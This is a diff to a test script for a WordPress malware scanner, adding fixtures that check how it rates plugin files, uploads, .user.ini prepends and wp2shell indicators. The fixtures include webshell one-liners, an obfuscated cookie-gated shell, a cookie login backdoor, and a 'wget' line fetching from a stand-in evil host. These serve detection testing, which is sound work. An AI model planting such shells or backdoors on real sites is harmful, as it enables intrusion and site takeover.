@@ -56,7 +56,7 @@ set_php 8.3.36   # A patched PHP for the baseline tests.
 section "1. Clean site"
 R=$(scan)
 has   "$R" '.verdict' "scan returns a verdict"
-if echo "$R" | jq -e '[.findings[] | select(.type=="version" and .severity!="info")] | length > 0' >/dev/null; then
+if echo "$R" | jq -e '[.findings[] | select(.type=="version" and (.severity=="critical" or .severity=="high"))] | length > 0' >/dev/null; then
 	has "$R" '.verdict == "VULNERABLE"' "unpatched clean site is VULNERABLE (not COMPROMISED)"
 	$WP php2shell scan --skip-core --format=summary >/dev/null 2>&1; CODE=$?
 	[ "$CODE" = "1" ] && ok "exit code 1 when vulnerable" || bad "exit code was $CODE, expected 1"
@@ -85,7 +85,7 @@ hasnt "$R" '[.findings[] | select((.severity=="critical" or .severity=="high") a
 hasnt "$R" "$(msg 'upgrade-temp-backup')" "WordPress's update backup folder is not flagged"
 hasnt "$R" "$(msg 'object-cache.php')" "object-cache.php drop-in is not flagged"
 hasnt "$R" "$(msg 'htaccess')" "Wordfence's protective uploads .htaccess is not flagged"
-hasnt "$R" "$(msg 'before every page')" "Wordfence's auto_prepend_file is not flagged"
+hasnt "$R" "$(sev high 'before every page')" "Wordfence's auto_prepend_file at the site root is not an alarm"
 rm -rf "$C/plugins/performance-lab" "$C/upgrade-temp-backup" "$C/object-cache.php" "$C/uploads/.htaccess" "$SITE/.user.ini"
 
 section "3. wp2shell indicators"
@@ -730,6 +730,104 @@ $WP option delete zzt_ok_js zzt_payload zzt_redirect >/dev/null
 $WP post delete "$P_OK" "$P_SPAM" "$P_FRAME" --force >/dev/null
 $WP eval 'foreach ( array( "wp2ss_t_code", "wp2ss_t_fetch", "a8f3k2m9x7q1w5e6r4" ) as $h ) { wp_clear_scheduled_hook( $h, array( "<?php system(\$_GET[1]);" ) ); wp_clear_scheduled_hook( $h, array( "wget -q https://evil.example/x.sh" ) ); wp_clear_scheduled_hook( $h ); }' >/dev/null
 rm -rf "$C/advanced-cache.php" "$C/plugins/wp2ss-t-org" "$C/mu-plugins/wp2ss-t-checksums.php" "$C/wp2ss-t-sums.json"
+
+section "17b. Newly installed plugins and host files"
+# A plugin that keeps PHP in its own uploads folder (like WP All Import's uploads/wpallimport/functions.php).
+mkdir -p "$C/plugins/wp-all-import" "$C/uploads/wpallimport" "$C/uploads/zzrandom" "$C/plugins/zz-normal"
+printf '<?php\n/*\nPlugin Name: WP All Import\nText Domain: wp_all_import_plugin\n*/\n' > "$C/plugins/wp-all-import/plugin.php"
+printf '<?php\nfunction wpai_custom_field( $v ) { return trim( $v ); }\n' > "$C/uploads/wpallimport/functions.php"
+touch -d '2024-01-01' "$C/uploads/wpallimport/functions.php"
+printf '<?php\nfunction wpai_new_field( $v ) { return trim( $v ); }\n' > "$C/uploads/wpallimport/fresh.php"
+printf '<?php\n$d = $_POST["d"];\nfile_put_contents( __DIR__ . "/x.txt", $d );\n' > "$C/uploads/wpallimport/handler.php"
+printf "<?php eval(\$_POST['x']);\n" > "$C/uploads/wpallimport/shell.php"
+printf '<?php\nfunction zz_fn() { return 1; }\n' > "$C/uploads/zzrandom/x.php"
+# Ordinary plugin code that merely looks like webshell code.
+printf '<?php\n/*\nPlugin Name: ZZ Normal\n*/\nclass ZZ_Runner { public function exec( $request ) { return $request; } public function system( $r ) { return $r; } }\nfunction zz_save_css() { file_put_contents( WP_CONTENT_DIR . "/zz.css", wp_unslash( $_POST["css"] ) ); }\n' > "$C/plugins/zz-normal/zz-normal.php"
+# Host and security-plugin firewalls, plugin-made must-use files and drop-ins.
+mkdir -p "$C/plugins/all-in-one-wp-security-and-firewall"
+printf '<?php\n/*\nPlugin Name: All In One WP Security\n*/\n' > "$C/plugins/all-in-one-wp-security-and-firewall/wp-security.php"
+printf 'auto_prepend_file = "%s/aios-bootstrap.php"\n' "$SITE" > "$SITE/.user.ini"
+mkdir -p "$C/uploads/zzfw" && printf 'auto_prepend_file = "%s/uploads/aios-bootstrap.php"\n' "$C" > "$C/uploads/.user.ini"
+printf 'auto_prepend_file = /usr/local/hostguard/protect.php\nauto_append_file = /var/lib/php/sessions/sess_p0wn\n' > "$C/.user.ini"
+printf 'auto_prepend_file = /usr/local/../../home/u/s.php\n' > "$SITE/php.ini"
+mkdir -p "$C/mu-plugins"
+printf '<?php\nrequire_once WP_PLUGIN_DIR . "/wp-all-import/plugin.php";\n' > "$C/mu-plugins/zz-loader.php"
+printf '<?php // ManageWP Worker loader\n' > "$C/mu-plugins/0-worker.php"
+printf '<?php\n// plugins/wp-all-import/ compatibility\nif ( isset( $_COOKIE["k"] ) ) { wp_set_auth_cookie( 1 ); }\n' > "$C/mu-plugins/zz-compat.php"
+mkdir -p "$C/plugins/user-switching" "$C/uploads/users" "$C/upgrade/wordpress-1"
+printf '<?php\n/*\nPlugin Name: User Switching\n*/\n' > "$C/plugins/user-switching/user-switching.php"
+SHELL_EVASIVE='<?php if(md5($_COOKIE["k"])=="x"){$h=getallheaders();$f=strrev("metsys");$f($h["X-C"]);}'
+printf '%s\n' "$SHELL_EVASIVE" > "$C/uploads/users/s.php"
+printf '%s\n' "$SHELL_EVASIVE" > "$C/upgrade/wordpress-1/s.php"
+printf '<?php\n// Page cache\nrequire_once WP_CONTENT_DIR . "/plugins/wp-all-import/plugin.php";\n' > "$C/advanced-cache.php"
+R=$(scan)
+has   "$R" "$(sev low 'PHP file in WP All Import.s folder in uploads: .*wpallimport/functions.php')" "older PHP in an installed plugin's own uploads folder is only low"
+has   "$R" "$(sev medium 'PHP file in WP All Import.s folder in uploads: .*wpallimport/fresh.php')" "...recent PHP there is medium (worth a look, not an alarm)"
+has   "$R" "$(sev medium 'PHP file in WP All Import.s folder in uploads: .*wpallimport/handler.php')" "...but request-handling code there is still worth a look (medium)"
+has   "$R" "$(sev critical 'Executes code straight from a web request: .*wpallimport/shell.php')" "...and a real webshell there is still critical"
+has   "$R" "$(sev high 'PHP file in a data folder.*uploads/zzrandom/x.php')" "PHP in an unknown uploads folder is still high"
+hasnt "$R" '[.findings[] | select((.location // "" | test("zz-normal")) and (.severity == "critical" or .severity == "high"))] | length > 0' "a method named exec() or system() isn't mistaken for a webshell"
+has   "$R" "$(sev medium 'Writes web-request input to a file.*zz-normal.php')" "saving custom CSS from a form is medium, not high"
+hasnt "$R" "$(msg "run .$SITE/aios-bootstrap.php.")" "All In One WP Security's firewall (aios-bootstrap.php at the site root) isn't flagged"
+has   "$R" "$(sev low 'makes PHP run ./usr/local/hostguard/protect.php')" "auto_prepend_file into a system folder (the host's) is only low"
+has   "$R" "$(sev high 'user.ini makes PHP run .*uploads/aios-bootstrap.php')" "...but a firewall file name anywhere else is still high"
+has   "$R" "$(sev high 'makes PHP run ./var/lib/php/sessions/sess_p0wn')" "...a PHP session file is never a host's system file (session poisoning)"
+has   "$R" "$(sev high 'php.ini makes PHP run ./usr/local/\\.\\./')" "...nor a path that climbs out with .."
+has   "$R" '[.findings[] | select(.type=="mu-plugin" and .severity=="low" and (.message|test("zz-loader.php.*loads WP All Import")))] | length > 0' "a must-use loader for an installed plugin is low"
+has   "$R" '[.findings[] | select(.type=="mu-plugin" and .severity=="low" and (.message|test("0-worker")))] | length > 0' "ManageWP's 0-worker.php must-use file is low"
+has   "$R" "$(sev low 'Drop-in advanced-cache.php .*loads WP All Import')" "a drop-in that loads an installed plugin's files is only a low note"
+has   "$R" '[.findings[] | select(.type=="mu-plugin" and .severity=="medium" and (.message|test("zz-compat")))] | length > 0' "a must-use file that logs people in isn't excused by mentioning a plugin"
+has   "$R" "$(sev high 'PHP file in a data folder.*uploads/users/s.php')" "a folder named 'users' isn't claimed by User Switching"
+has   "$R" "$(sev high 'PHP file in a data folder.*upgrade/wordpress-1/s.php')" "upgrade/wordpress-1/ without WordPress's layout isn't an update leftover"
+# Updates WordPress was unpacking when it was interrupted: one low finding per folder, not one per file.
+mkdir -p "$C/upgrade/wp-all-import.3.7.1/wp-all-import" "$C/upgrade/wordpress-7.1.4-new-bundled/wordpress/wp-admin"
+printf '<?php\nfunction pmxi_x() {}\n' > "$C/upgrade/wp-all-import.3.7.1/wp-all-import/x.php"
+printf '<?php\n$a = 1;\n' > "$C/upgrade/wordpress-7.1.4-new-bundled/wordpress/wp-admin/a.php"
+printf '<?php\n$b = 2;\n' > "$C/upgrade/wordpress-7.1.4-new-bundled/wordpress/wp-admin/b.php"
+# A generic folder name isn't claimed by a plugin whose name starts the same way.
+mkdir -p "$C/plugins/cache-enabler" "$C/uploads/cache"
+printf '<?php\n/*\nPlugin Name: Cache Enabler\n*/\n' > "$C/plugins/cache-enabler/cache-enabler.php"
+printf '<?php\nfunction zz_c() { return 1; }\n' > "$C/uploads/cache/x.php"
+R=$(scan)
+has   "$R" "$(sev medium '^1 PHP file.s. left over from an unfinished WP All Import update or install')" "a plugin update left in wp-content/upgrade is one finding (medium), not one per file"
+has   "$R" "$(sev medium '^2 PHP file.s. left over from an unfinished WordPress update or install')" "a core update left in wp-content/upgrade is one finding (medium)"
+hasnt "$R" "$(msg 'PHP file in a data folder.*upgrade/wordpress-7.1.4')" "...with no per-file alarms"
+has   "$R" "$(sev high 'PHP file in a data folder.*uploads/cache/x.php')" "uploads/cache/ isn't treated as Cache Enabler's folder"
+rm -rf "$C/upgrade/wp-all-import.3.7.1" "$C/upgrade/wordpress-7.1.4-new-bundled" "$C/plugins/cache-enabler" "$C/uploads/cache"
+
+# Indicators from November research: wp2shell persistence (Dosdediez) and PHP2Shell honeypot captures (0x4D31).
+mkdir -p "$C/plugins/database-repair-assistant-1a2b3c4d" "$C/uploads/2026/10"
+printf '<?php\n/*\nPlugin Name: Database Repair Assistant\n*/\n' > "$C/plugins/database-repair-assistant-1a2b3c4d/plugin.php"
+printf '<?php\n/* WP_Core_Integrity a1b2c3d4 */\n$x = 1;\n/* WP_Core_Integrity a1b2c3d4 */\n' > "$C/plugins/zz-normal/inc.php"
+printf '<?php echo 1;\n' > "$C/uploads/2026/10/shell_059f4c5d.php"
+printf '# BEGIN wp_compat_9f8e7d6c\nRewriteRule ^x$ - [L]\n# END wp_compat_9f8e7d6c\n' >> "$SITE/.htaccess"
+$WP user create w2s_ops w2s@example.com --role=administrator --quiet >/dev/null 2>&1
+$WP option update _site_transient_health_5e6f7a8b1c 'x' >/dev/null 2>&1
+P2S=$(mktemp)
+echo '84.32.50.51 - - [23/Oct/2026:10:00:00 +0000] "POST /?c=echo%20p2s_v2_alive HTTP/1.1" 200 10 "-" "Mozilla/5.0"' >> "$P2S"
+R=$(scan --log="$P2S")
+has   "$R" "$(sev critical 'Plugin folder named like a wp2shell backdoor: database-repair-assistant-1a2b3c4d')" "fake database-repair-assistant-<hex> plugin"
+has   "$R" "$(sev high 'WP_Core_Integrity markers.*inc.php')" "WP_Core_Integrity marker in code"
+has   "$R" "$(sev high 'shell_<8 hex>.*shell_059f4c5d.php')" "shell_<8 hex>.php webshell name"
+has   "$R" "$(sev high 'htaccess has a block marked .wp_compat_9f8e7d6c.')" "wp_compat_<hex> block in .htaccess"
+has   "$R" "$(sev high 'Administrator .w2s_ops. .* named like the accounts wp2shell attackers create')" "w2s_ admin account"
+has   "$R" "$(sev high 'Setting ._site_transient_health_5e6f7a8b1c. .*named like the one a wp2shell backdoor stores')" "_site_transient_health_<hex> option"
+has   "$R" "$(sev high 'log lines show PHP2Shell exploit tools')" "p2s_v2_alive probe in the access log"
+$WP user delete "$($WP user get w2s_ops --field=ID 2>/dev/null)" --yes --quiet >/dev/null 2>&1
+$WP option delete _site_transient_health_5e6f7a8b1c >/dev/null 2>&1
+sed -i '/wp_compat_9f8e7d6c/d;/^RewriteRule \^x\$ - \[L\]$/d' "$SITE/.htaccess"
+rm -rf "$C/plugins/database-repair-assistant-1a2b3c4d" "$C/uploads/2026/10/shell_059f4c5d.php" "$P2S"
+
+# WordPress's October 28, 2026 security release.
+printf "<?php \$GLOBALS['wp_version'] = '7.1.3';\n" > "$C/mu-plugins/wp2ss-test-version.php"
+R=$(scan)
+has   "$R" "$(sev medium 'WordPress 7.1.3 is missing the October 28, 2026 security release .7.1.4.')" "WordPress 7.1.3 is reminded of the 7.1.4 security release (medium)"
+hasnt "$R" '[.findings[] | select(.type=="version" and (.severity=="critical" or .severity=="high"))] | length > 0' "...which alone doesn't read as vulnerable (only wp2shell does)"
+printf "<?php \$GLOBALS['wp_version'] = '7.1.4';\n" > "$C/mu-plugins/wp2ss-test-version.php"
+R=$(scan)
+hasnt "$R" "$(msg 'missing the October 28, 2026 security release')" "WordPress 7.1.4 has the security release"
+rm -f "$C/mu-plugins/wp2ss-test-version.php"
+rm -rf "$C/plugins/wp-all-import" "$C/uploads/wpallimport" "$C/uploads/zzrandom" "$C/plugins/zz-normal" "$C/mu-plugins/zz-loader.php" "$C/mu-plugins/0-worker.php" "$C/mu-plugins/zz-compat.php" "$C/advanced-cache.php" "$SITE/.user.ini" "$SITE/php.ini" "$C/.user.ini" "$C/zz.css" "$C/uploads/.user.ini" "$C/uploads/zzfw" "$C/plugins/all-in-one-wp-security-and-firewall" "$C/plugins/user-switching" "$C/uploads/users" "$C/upgrade/wordpress-1"
 
 section "18. Cleanup → clean again"
 rm -rf "$C/plugins/wp2shell_6a5566a6" "$C/plugins/cmsmap" "$C/upgrade/wp2shell_79b06a80" \
